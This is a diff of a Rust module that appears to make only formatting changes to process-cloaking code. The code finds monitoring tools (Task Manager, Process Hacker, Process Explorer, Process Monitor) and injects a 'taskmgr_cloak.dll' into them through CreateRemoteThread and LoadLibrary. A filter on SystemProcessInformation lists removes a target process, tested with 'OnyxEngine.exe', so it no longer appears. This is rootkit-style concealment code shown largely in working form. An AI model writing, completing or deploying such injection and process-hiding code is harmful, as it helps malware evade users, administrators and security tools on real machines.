@@ -1,8 +1,8 @@
+use crate::win32::*;
 use std::collections::HashSet;
 use std::ffi::c_void;
 use std::path::{Path, PathBuf};
 use std::sync::atomic::{AtomicBool, Ordering};
-use crate::win32::*;
 
 pub const SYSTEM_PROCESS_INFORMATION_CLASS: u32 = 5;
 
@@ -65,7 +65,11 @@ pub unsafe fn filter_system_process_information(
         let current = current_ptr as *mut SystemProcessInformation;
         let (name, pid, next_offset) = unsafe {
             let entry = &*current;
-            (entry.image_name.to_string(), entry.unique_process_id, entry.next_entry_offset)
+            (
+                entry.image_name.to_string(),
+                entry.unique_process_id,
+                entry.next_entry_offset,
+            )
         };
 
         let match_pid = target_pid.map(|t| t == pid).unwrap_or(false);
@@ -141,10 +145,19 @@ impl TaskmgrCloakManager {
 
             if Process32FirstW(snapshot, &mut entry) == TRUE {
                 loop {
-                    let name_len = entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(entry.szExeFile.len());
-                    let name = String::from_utf16_lossy(&entry.szExeFile[..name_len]).to_lowercase();
+                    let name_len = entry
+                        .szExeFile
+                        .iter()
+                        .position(|&c| c == 0)
+                        .unwrap_or(entry.szExeFile.len());
+                    let name =
+                        String::from_utf16_lossy(&entry.szExeFile[..name_len]).to_lowercase();
 
-                    if name == "taskmgr.exe" || name == "processhacker.exe" || name == "procexp.exe" || name == "procmon.exe" {
+                    if name == "taskmgr.exe"
+                        || name == "processhacker.exe"
+                        || name == "procexp.exe"
+                        || name == "procmon.exe"
+                    {
                         pids.push(entry.th32ProcessID);
                     }
 
@@ -179,16 +192,20 @@ impl TaskmgrCloakManager {
         }
 
         if let Ok(current_exe) = std::env::current_exe()
-            && let Some(parent) = current_exe.parent() {
-                let p1 = parent.join("taskmgr_cloak.dll");
-                if p1.exists() {
-                    return Some(p1);
-                }
-                let p2 = parent.join("modules").join("injections").join("taskmgr_cloak.dll");
-                if p2.exists() {
-                    return Some(p2);
-                }
+            && let Some(parent) = current_exe.parent()
+        {
+            let p1 = parent.join("taskmgr_cloak.dll");
+            if p1.exists() {
+                return Some(p1);
             }
+            let p2 = parent
+                .join("modules")
+                .join("injections")
+                .join("taskmgr_cloak.dll");
+            if p2.exists() {
+                return Some(p2);
+            }
+        }
 
         None
     }
@@ -204,7 +221,11 @@ impl TaskmgrCloakManager {
 
         unsafe {
             let proc = OpenProcess(
-                PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
+                PROCESS_CREATE_THREAD
+                    | PROCESS_QUERY_INFORMATION
+                    | PROCESS_VM_OPERATION
+                    | PROCESS_VM_WRITE
+                    | PROCESS_VM_READ,
                 FALSE,
                 pid,
             );
@@ -255,7 +276,8 @@ impl TaskmgrCloakManager {
                 return false;
             }
 
-            let thread_fn: unsafe extern "system" fn(*mut c_void) -> u32 = std::mem::transmute(load_lib);
+            let thread_fn: unsafe extern "system" fn(*mut c_void) -> u32 =
+                std::mem::transmute(load_lib);
             let thread = CreateRemoteThread(
                 proc,
                 std::ptr::null_mut(),
@@ -293,10 +315,9 @@ impl TaskmgrCloakManager {
                 if let Some(dll_path) = Self::find_cloak_dll() {
                     let targets = Self::find_task_managers();
                     for pid in targets {
-                        if !injected.contains(&pid)
-                            && Self::inject_taskmgr_cloak(pid, &dll_path) {
-                                injected.insert(pid);
-                            }
+                        if !injected.contains(&pid) && Self::inject_taskmgr_cloak(pid, &dll_path) {
+                            injected.insert(pid);
+                        }
                     }
                 }
 
@@ -318,8 +339,14 @@ mod tests {
     #[test]
     fn test_filter_system_process_information_middle() {
         let mut name1: Vec<u16> = "System".encode_utf16().chain(std::iter::once(0)).collect();
-        let mut name2: Vec<u16> = "OnyxEngine.exe".encode_utf16().chain(std::iter::once(0)).collect();
-        let mut name3: Vec<u16> = "explorer.exe".encode_utf16().chain(std::iter::once(0)).collect();
+        let mut name2: Vec<u16> = "OnyxEngine.exe"
+            .encode_utf16()
+            .chain(std::iter::once(0))
+            .collect();
+        let mut name3: Vec<u16> = "explorer.exe"
+            .encode_utf16()
+            .chain(std::iter::once(0))
+            .collect();
 
         let size = std::mem::size_of::<SystemProcessInformation>();
         let mut buf = vec![0u8; size * 3];
@@ -361,7 +388,10 @@ mod tests {
 
     #[test]
     fn test_filter_system_process_information_by_name() {
-        let mut name1: Vec<u16> = "notepad.exe".encode_utf16().chain(std::iter::once(0)).collect();
+        let mut name1: Vec<u16> = "notepad.exe"
+            .encode_utf16()
+            .chain(std::iter::once(0))
+            .collect();
         let size = std::mem::size_of::<SystemProcessInformation>();
         let mut buf = vec![0u8; size];
 
